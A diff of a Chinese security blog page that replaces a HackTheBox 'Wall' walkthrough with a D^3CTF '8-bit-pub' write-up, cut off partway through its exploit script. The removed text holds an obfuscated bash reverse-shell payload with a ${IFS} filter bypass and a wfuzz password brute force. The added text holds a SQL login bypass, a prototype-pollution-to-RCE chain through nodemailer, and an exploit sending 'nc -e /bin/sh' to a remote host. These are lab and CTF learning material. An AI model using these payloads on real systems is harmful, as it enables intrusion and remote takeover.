@@ -22,13 +22,13 @@
 
   <!-- 页面元数据 -->
   
-  <title>hackthebox-Wall - byc_404&#39;s blog</title>
+  <title>D^3CTF 8-bit-pub - byc_404&#39;s blog</title>
   
-    <meta name="keywords" content="hackthebox,pentest">
+    <meta name="keywords" content="WEB,wp,Node.js">
   
 
   
-    <meta name="description" content=" 总算是挺过了期末12门的魔鬼考试日程，迎来了寒假……这次寒假打算学的还挺多的，也希望自己能坚持学习，把知识尽量融会贯通吧。之前曾说过希望能早日拿下自己在hackthebox上的第一台靶机，没想到这么快就在帮助下拿到手了。其实在进入期末复习阶段中的一段时间，自己就参考youtube上一位优秀的hacker you...">
+    <meta name="description" content="周末进行的d^3CTF原本自己是没参加的。不过因为被问到了其中一道题目所以就做了下, 大概花了2个小时。题目难度虽然中等，不过个人认为其利用链的组成都是比较经典的漏洞。这里分享下自己的做题思路">
   
 
   <!-- feed -->
@@ -408,7 +408,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       <h1 class="title">
-        hackthebox-Wall
+        D^3CTF 8-bit-pub
       </h1>
       <div class='new-meta-box'>
         
@@ -432,7 +432,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
             <div class="new-meta-item date">
   <a class='notlink'>
     <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：Jan 12, 2020</p>
+    <p>发布于：Mar 6, 2021</p>
   </a>
 </div>
 
@@ -443,7 +443,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <div class="new-meta-item browse leancloud">
     <a class='notlink'>
       
-      <div id="lc-pv" data-title="hackthebox-Wall" data-path="/2020/01/12/hackthebox-Wall/">
+      <div id="lc-pv" data-title="D^3CTF 8-bit-pub" data-path="/2021/03/06/D%5E3CTF-8-bit-pub/">
         <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
         <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
         次浏览
@@ -461,61 +461,64 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   
   
-  <p> 总算是挺过了期末12门的魔鬼考试日程，迎来了寒假……这次寒假打算学的还挺多的，也希望自己能坚持学习，把知识尽量融会贯通吧。之前曾说过希望能早日拿下自己在hackthebox上的第一台靶机，没想到这么快就在帮助下拿到手了。其实在进入期末复习阶段中的一段时间，自己就参考youtube上一位优秀的hacker youtuber关于hackthebox的视频成功拿到了靶机，只不过一直没写文章。而现在这台Wall靶机在hackthebox上也已经处于下架状态，所以我就简单记录一下拿下Wall的过程，没法贴实操图了。</p>
+  <p>周末进行的d^3CTF原本自己是没参加的。不过因为被问到了其中一道题目所以就做了下, 大概花了2个小时。题目难度虽然中等，不过个人认为其利用链的组成都是比较经典的漏洞。这里分享下自己的做题思路</p>
 <a id="more"></a>
 
-<p>参考的youtuber:IppSec  <a href="https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA" target="_blank" rel="noopener">https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA</a><br>幸好自己英语水平过硬，可以啃他的生肉视频。感谢这位大佬，确实帮到了我很多。</p>
-<p><img src="/2020/01/12/hackthebox-Wall/1.jpg" class="lazyload" data-srcset="1.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="Wall"><br><strong>本机ip:10.10.14.3</strong><br>(也许吧,记不得了hhh)<br><strong>靶机ip:10.10.10.157</strong></p>
-<p>然后回顾一下整个过程吧。首先第一步当然是使用hackthebox提供给我们的ovpn连接。这样我们就创建好了与靶机之间的虚拟专有网络。可以访问到题目。</p>
-<p>之后就是面对hackthebox上一众靶机的常规套路：使用nmap进行端口扫描（这应该也是正常渗透过程中的第一步）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namp -sC -sV -oA namp&#x2F;wall 10.10.10.157</span><br></pre></td></tr></table></figure>
-<p>我学习了下那位youtuber的好习惯，这里namp不仅做了扫描，同时还保存为文件方便回顾。</p>
-<p>之后发现开放了两个端口，80与22,也就是http与ssh对应服务。尝试直接访问，也得到了apache的默认页面。基于ssh并无太多利用之处，可以直接从web页面下手。<br>那么先扫下目录，来看看有没有什么可能有趣的,在简单的FUZZ一下robots.txt,.htacess都无结果后，果断使用gobuster：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;10.10.10.157&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure>
+<h2 id="analysis"><a href="#analysis" class="headerlink" title="analysis"></a>analysis</h2><p>首先拿到源码分析下。并不像简单的nodejs题目存在显眼的漏洞利用点。但是有一些地方是拥有express 开发经验的小伙伴绝不能疏忽掉的</p>
+<p><img src="https://hackmd.summershrimp.com/uploads/upload_511d891830c1af317f68cad89595d906.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_511d891830c1af317f68cad89595d906.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p>这里用的是没有<code>展开</code>的post数据中间件与json中间件。这意味着当我们发送json数据时,可以传入数组/对象。</p>
+<p>我们接下来继续看题目思路。</p>
+<p>访问admin路由需要<code>req.session.username</code> 为 admin. 之后在admin路由处调用了一个非常显眼的赋值操作。最后将我们的数据通过<code>nodemailer</code>中的<code>sendMail</code>发送邮件。</p>
+<p>既然需要session 为admin , 我们就要作为admin 登录。我们来看登录sql语句的操作。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sql.query(<span class="string">"SELECT * FROM users WHERE username = ? AND password = ?"</span>,[username, password],<span class="function"><span class="keyword">function</span> (<span class="params">err, res</span>) </span>&#123;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>扫到了一个/monitoring，尝试访问，却发现提示unauthorized。并提示输入用户密码，尝试下admin-admin,admin-password,guest-guest等等可能的弱口令无果，于是得另辟蹊径。<br>顺便补一下webAPI中authorize跟authentication的区别：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">身份验证（Authentication）：确定用户是谁。</span><br><span class="line"></span><br><span class="line">授权(Authorization)：确定用户能做什么，不能做什么。</span><br></pre></td></tr></table></figure>
-<p>这里从dalao那学到了一招：抓包后，当以GET方式访问/monitoring时，我们得到的是401 unauthorized,但如果以POST方式访问，就会的到页面提示，并拿到后续操作的页面目录  /centreon</p>
-<p>再度访问，终于得到一个centreon的登录界面，同时版本为19.04.0那么问题就回到用户密码上了。<br>为了能了解这一系统，当然需要谷歌了解下centreon到底为何物，以及有什么可以利用的。很快就可以发现，这一版本存在有sql注入，RCE命令执行等等漏洞；或者使用kali上的searchspolit</p>
-<figure class="highlight plain"><figcaption><span>centreon```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">发现有RCE等等漏洞以及利用，我们对RCEgetshell相对比较轻松，那么就不妨看看RCE的利用</span><br><span class="line">&#96;&#96;&#96; searchsploit  -x &quot;此处接利用的脚本文件地址&quot;</span><br></pre></td></tr></table></figure>
-<p>仔细审过后发现，从上面提到的种种漏洞到现在具体的RCE，我们都需要在autheticated的前提下利用，那么还是得从登陆界面的用户密码下手。</p>
-<p>这里又从大佬那学到了第二招：在登录界面随便输入尝试登录并抓包时，会发现burp抓包得内容除了admin,password参数，还会有centreon自带的token。这就给我们的暴力破解可能性画上了句号。那么还有其他方法爆破吗？有的，通过API来尝试： google后发现确实存在centreon的api,而且确实只传了username,password两个参数，是可以爆破的。<br>之后继续FUZZ，于是准备post访问：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;centreon&#x2F;api&#x2F;index.php?action&#x3D;authenticate</span><br></pre></td></tr></table></figure>
-<p>并顺便传参admin=admin&amp;password=passowrd。发现返回bad crendentials。并且改掉username参数时返回的是一致的，这样就不好通过response来爆破。那只能猜测用户名是admin了。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz  http:&#x2F;&#x2F;10.10.10.157&#x2F;centreon&#x2F;api&#x2F;index.php?action&#x3D;authenticate -w &#x2F;usr&#x2F;share&#x2F;seclist&#x2F;Passwords&#x2F;darkweb2017-top1000.txt  -d &quot;username&#x3D;admin&amp;password&#x3D;FUZZ&quot; --hc 403</span><br></pre></td></tr></table></figure>
-<p>–hc 可以筛掉返回403的结果。<br>上面用的这个字典我好像kali上并没有，只能自己找字典用了。<br>很快得到正确的密码 password1……这个弱口令真的是强，简单归简单，总归人手FUZZ应该不太能FUZZ出来……</p>
-<p>之后就成功登陆，轮到我们大展身手了。在网上可以查到很多种利用，我参考了dalao的那种命令执行（像这种控制台里的确存在很多可以注入利用的地方）在centreon的configuration中可以进行命令执行,简单试下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping -c 1 127.0.0.1;</span><br></pre></td></tr></table></figure>
-<p>linux的ping貌似与windows有区别。<br>然而在命令执行时失败了并返回403。继续尝试其他的发现可能是过滤了空格。于是使用常见的一种绕过手段：<code>${IFS}</code>绕过空格。<br>另外，我还学到了有别于自己原来垃圾的把空格一个个换成${IFS}的手段。直接在linux命令行中</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;ping -c 1 127.0.0.1;&#39;|sed  &#39;s&#x2F; &#x2F;$&#123;IFS&#125;&#x2F;g&#39;</span><br></pre></td></tr></table></figure>
-<p>就得到了payload ,再度放在刚刚的命令执行空格中，保存，并export configuration以执行命令。发现成功了。<br>既然测试好了，那我们就直接getshell吧。<br>原payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.3&#x2F;8888 0&gt;&amp;1&#39;</span><br></pre></td></tr></table></figure>
-<p>这里bash -c 是直接将后面的字符串内容执行命令。而后面bash -i等等就是bash反弹shell的命令了。(这里自己其实自学了好久，也折腾了不晒时间才成功在kali上拿到自己的一台公网vps的shell，之后如果写学习笔记再详细解释理解下)<br>这里不妨用base64编码下绕检查,我也不记得这里不用base64编码是否会产生被过滤bash的问题，但毕竟bash是高危命令，还是执行编码为妙。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.3&#x2F;8888 0&gt;&amp;1&#39; &quot;|base 64</span><br></pre></td></tr></table></figure>
-<p>得到：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzg4ODggMD4mMSc&#x3D;</span><br></pre></td></tr></table></figure>
-<p>那么绕过空格：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzg4ODggMD4mMSc&#x3D; | base4 -d | bash&quot; |sed &#39;s&#x2F; &#x2F;$&#123;IFS&#125;&#x2F;g&#39;</span><br></pre></td></tr></table></figure>
-<p>现payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo$&#123;IFS&#125;YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzg4ODggMD4mMSc&#x3D;$&#123;IFS&#125;|$&#123;IFS&#125;base4$&#123;IFS&#125;-d$&#123;IFS&#125;|$&#123;IFS&#125;bash;</span><br></pre></td></tr></table></figure>
-<p>记得最后要有分号。之后在自己kali上监听8888端口：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8888</span><br></pre></td></tr></table></figure>
-<p>命令执行即可getshell。</p>
-<h2 id="拿-user-权限"><a href="#拿-user-权限" class="headerlink" title="拿 user 权限"></a>拿 user 权限</h2><p>hackthebox的靶机拿下，并不只是简单的getshell,而是要分别拿到root权限与user权限下的两个文件中的flag提交才算成功。这里自己因为没什么提权经验，很大程度上参考了不少wp与视频才算成功。<br>先从简单的user开始：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la</span><br></pre></td></tr></table></figure>
-<p>发现user有shelby与sysmonitor两个。找一下shelby的内容后发现只有shelby有权限读user.txt即flag。<br>经过一番挖掘，可以发现能够找到/opt/.shelby/backup这一文件。<code>file backup</code>后发现是一个python编译文件，可能就是pyc吧。执行下<code>python backup</code><br>这时我们如果再ls -la，就会发现我们不知怎么已经完成了authentication。<br>进入目录。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64 backup</span><br></pre></td></tr></table></figure>
-<p>将结果在本机的vim保存为backup.pyc.b64，再base64解码，这样这样一个pyc文件就算到了本机了。然后我们用python 的uncompyle库反编译一下。还原了py文件。<br>从其中直接拿到shelby 的密码 ShelbyPassw@rdIsStrong!<br>ssh登录shelby即可读user.txt。</p>
-<h2 id="拿-root-权限"><a href="#拿-root-权限" class="headerlink" title="拿 root 权限"></a>拿 root 权限</h2><p>拿root权限时我就比较尴尬了，因为这里root的payload可以直接拿到root跟shelby二者的权限。<br>参考了一个解法：</p>
-<blockquote>
-<p>/bin/screen-4.5.0<br>For this exact version there is a vulnerability that allows to escalate to root</p>
-</blockquote>
-<p>这里/bin下的screen版本允许我们直接利用漏洞拿到root权限。payload在此：<a href="https://github.com/XiphosResearch/exploits/tree/master/screen2root" target="_blank" rel="noopener">https://github.com/XiphosResearch/exploits/tree/master/screen2root</a><br>那接下来只用把脚本放到我们拿到shell的机子执行screenroot.sh即可。那么如何传输文件呢？这里运用到了python强大的功能，也是自己之前曾用过的SimpleHTTPServer</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpliHTTPServer</span><br></pre></td></tr></table></figure>
-<p>这样就默认监听8000端口了，先把脚本放在根目录。尝试<code>curl 10.10.14.3:8000/screenroot.sh</code>失败,没有安装curl。再尝试<code>wget 10.10.14.3:8000/screenroot.sh</code>成功，在靶机shell拿到脚本。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash screenroot.sh</span><br></pre></td></tr></table></figure>
-<p>运行成功，进入shell的交互页面。cat /root/root.txt即可，还可以cat /home/shelby/user.txt拿到之前的userflag。</p>
-<p>大抵如此吧。当时即使在参考，自己也花了不少时间在getshell后的提权上，看来自己还要再多加了解学习呀。寒假已经开始，我也争取再拼一把，多学一些web方面的知识吧。</p>
+<p>很奇怪。虽然没有字符拼接,但也没有用常规的占位符处理。传入的参数是一个数组。我们来看官方文档对这种情况的处理。<br><img src="https://hackmd.summershrimp.com/uploads/upload_f8b8316687168c885a30ded874c17969.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_f8b8316687168c885a30ded874c17969.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p>可以看出这是一种转义字符的用法。但是注意此处并没有限制传入参数只能为字符。还记得上面json中间件的存在吗，我们当然可以直接传入对象/数组,而mysql依赖对于这种情况的处理是喜闻乐见的：<br><img src="https://hackmd.summershrimp.com/uploads/upload_9ac74cc0a7c888a5b8df57c73c74ae21.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_9ac74cc0a7c888a5b8df57c73c74ae21.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p>此处的键值会被展开，那我们自然可以直接构造一个真值的登录语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username = <span class="string">'admin'</span> <span class="keyword">AND</span> <span class="keyword">password</span> = <span class="string">`password`</span> =<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>看到登录路由并没有语句判断传入参数是否只为字符串，所以就可以用<code>{&quot;username&quot;:&quot;admin&quot;, &quot;password&quot;: {&quot;password&quot;: &quot;1&quot;}}</code> 成功登录,来到admin路由。</p>
+<p>ps: 之前出NCTF 的nosql注入时就曾强调过,传参一定要检查类型。这两处都是因为允许json数据传入对象导致注入的典型。也是老到掉牙的问题了。</p>
+<h2 id="prototype-pollution-to-RCE"><a href="#prototype-pollution-to-RCE" class="headerlink" title="prototype pollution to RCE"></a>prototype pollution to RCE</h2><p>  接下来我把重心放在admin控制器那非常显眼的代码那，</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> contents = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.keys(req.body).forEach(<span class="function">(<span class="params">key</span>) =&gt;</span> &#123;</span><br><span class="line">  shvl.set(contents, key, req.body[key]);</span><br><span class="line">&#125;);</span><br><span class="line">contents.from = <span class="string">'"admin" &lt;admin@8-bit.pub&gt;'</span>;</span><br></pre></td></tr></table></figure>
+
+<p>熟悉node 漏洞的应该一眼就能看出来这里可能存在原型链污染漏洞。<br>（不直接传值非要遍历可控json数据的keys,太明显了。。。）</p>
+<p>上github搜索下shvl会发现这是一个star 连100都不到的依赖。如果关注过hackerone上node 第三方依赖漏洞的话，就会留意到上面有很多非常冷门的依赖的原型链污染漏洞。这些依赖大多使用量少，以至于开发者有时也懒得修。官方也不会注重其安全性(所以开发中还是用使用量多的依赖2333)</p>
+<p>按照这个思路搜索<code>shvl prototype pollution</code>不难发现</p>
+<p><a href="https://snyk.io/vuln/SNYK-JS-SHVL-1054936" target="_blank" rel="noopener">https://snyk.io/vuln/SNYK-JS-SHVL-1054936</a> </p>
+<p>的确存在污染漏洞。不过貌似现在版本已经修复了。我们来看看修复代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>  (<span class="params">object, path, val, obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> !<span class="regexp">/__proto__/</span>.test(path) &amp;&amp; ((path = path.split ? path.split(<span class="string">'.'</span>) : path.slice(<span class="number">0</span>)).slice(<span class="number">0</span>, <span class="number">-1</span>).reduce(<span class="function"><span class="keyword">function</span> (<span class="params">obj, p</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> obj[p] = obj[p] || &#123;&#125;;</span><br><span class="line">  &#125;, obj = object)[path.pop()] = val), object;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>此处比较尴尬的是，作者修复的方式只是单纯的检查 <code>path</code> 是否含<code>__proto__</code>. 然而它赋值的方法是通过循环对象赋值的。绕过方法太常见了。<code>constructor.prototype</code>即可</p>
+<p>poc</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> shvl = <span class="built_in">require</span>(<span class="string">'shvl'</span>); </span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125; </span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Before : "</span> + obj.isAdmin); </span><br><span class="line">shvl.set(obj, <span class="string">'constructor.prototype.isAdmin'</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"After : "</span> + obj.isAdmin);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.prototype);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Before : undefined</span></span><br><span class="line"><span class="comment">After : true</span></span><br><span class="line"><span class="comment">[Object: null prototype] &#123; isAdmin: true &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+
+<p>这里可以看到我们已经污染到基类原型的任意属性上了,这可以算是非常强大的。假如题目用了模板引擎基本上就结束直接RCE了。不过显然，题目的nodemailer还没有用到。我们先来看下nodemailer的历史漏洞</p>
+<p>很快我们就能找到<br><a href="https://snyk.io/vuln/SNYK-JS-NODEMAILER-1038834" target="_blank" rel="noopener">https://snyk.io/vuln/SNYK-JS-NODEMAILER-1038834</a><br>这里的命令注入漏洞。来看下关键代码</p>
+<p>nodemailer\lib\sendmail-transport\index.js<br>中 , SendmailTransport 类的send 方法<br><img src="https://hackmd.summershrimp.com/uploads/upload_e5d1ceaee1bb4a6f64015380340c71e8.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_e5d1ceaee1bb4a6f64015380340c71e8.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p>这里命令注入的原理是，args参数<code>-i</code>与默认为空的<code>this.args</code>与可控的<code>envelope.to</code>拼接了。这就导致我们可以额外塞入其他参数。做到参数注入,像<code>-Dfilename@example.com (Debug output ffile)</code></p>
+<p>然后,下面调用了一个_spawn,其实就是<code>spawn(sendmail,args)</code>。如果说php里大家最先会去找的恶意函数是<code>system,exec</code>等os函数，nodejs中相对应的肯定就是<code>spawn,execSync</code>这样的了(其实都是调用的spawn),更不用说,基类污染 + child_process = RCE.</p>
+<p>既然这里有子进程函数。我们又有任意链上的污染,这样就有两种方式RCE了。一个朴素的想法就是简单检查下看看其子进程函数参数是否可控。</p>
+<p>分享一个非常常见的小技巧，要知道这个属性是不是会受到链上污染的影响，直接看代码结构就好了<br><img src="https://hackmd.summershrimp.com/uploads/upload_25ae990dedc37a7e21849968339fcad6.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_25ae990dedc37a7e21849968339fcad6.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p>基本上出现<code>if(xxx.xxx)</code>这样语句的,它用来判断的属性多半是没有预先赋值的。所以才会通过if来判断是否有值,来写条件语句。而这些属性基本都是可污染的。正因如此，我们可以直接做到污染<code>options.args</code> 与<code>options.path</code>.等于是完全控制了spawn的参数。</p>
+<p>spawn的第一个参数是command,第二个是数组接收 command-line arguments。我们可以用<code>/bin/sh -c &quot;xxx&quot;</code>执行任意命令</p>
+<p>那么题目中的sendmail会不会默认走到这里呢？我们看下mail.js中<code>nodemailer.createTransport</code>的代码</p>
+<p><img src="https://hackmd.summershrimp.com/uploads/upload_aafe8f0bc20b3da6976a4fd16fcfe6c0.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_aafe8f0bc20b3da6976a4fd16fcfe6c0.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p>显然需要options中设置 sendmail 为true,我们的<code>transporter</code>才会是<code>SendmailTransport</code>. 这里跟上面是一样的道理，我们直接污染 sendmail 属性即可</p>
+<p>接下来就很轻松了</p>
+<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>  方便调试起见，我们先本地起一下代码。这里都很好配置，稍微需要注意的是smtp服务器的设置。我们直接看官方文档 <a href="https://nodemailer.com/about/" target="_blank" rel="noopener">https://nodemailer.com/about/</a> 按照官方的配置直接<a href="https://ethereal.email/create" target="_blank" rel="noopener">https://nodemailer.com/about/</a> 创立一个账户。就可以跑起来了</p>
+<p>然后按照上面的利用链,写exp打一下，本地很快通了，远程的话找了下只能nc弹shell比较方便。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">r = s.post(<span class="string">'http://ce775e2992.8bit-pub.d3ctf.io/user/signin'</span>, json=&#123;</span><br><span class="line">    <span class="string">'username'</span>: <span class="string">'admin'</span>,</span><br><span class="line">    <span class="string">'password'</span>: &#123;</span><br><span class="line">        <span class="string">'password'</span>: <span class="number">1</span></span><br><span class="line">    &#125;&#125;,</span><br><span class="line">    cookies=&#123;</span><br><span class="line">    <span class="string">'session'</span>: <span class="string">'s%3Asis-4wQQfN9QjaqEJAhBIL4iPP_e-qnr.p1CqQc3RiekkFz5FYzBRR9%2BO3j%2FIUX0vPh2sdkcuMk8'</span></span><br><span class="line">&#125;)</span><br><span class="line">print(r.json())</span><br><span class="line">r = s.post(<span class="string">'http://ce775e2992.8bit-pub.d3ctf.io/admin/email'</span>, json=&#123;</span><br><span class="line">    <span class="string">'from'</span>: <span class="string">"admin@123.com"</span>,</span><br><span class="line">    <span class="string">'to'</span>: <span class="string">'j3c9g.tls@inbox.testmail.app'</span>,</span><br><span class="line">    <span class="string">'contents'</span>: <span class="string">"bycbycbyc"</span>,</span><br><span class="line">    <span class="string">"constructor.prototype.sendmail"</span>: <span class="literal">True</span>,</span><br><span class="line">    <span class="string">"constructor.prototype.path"</span>: <span class="string">"/bin/sh"</span>,</span><br><span class="line">    <span class="string">"constructor.prototype.args"</span>: [<span class="string">"-c"</span>, <span class="string">"nc xxx 9001 -e /bin/sh"</span>],</span><br><span class="line">&#125;, cookies=&#123;</span><br><span class="line">    <span class="string">'session'</span>: <span 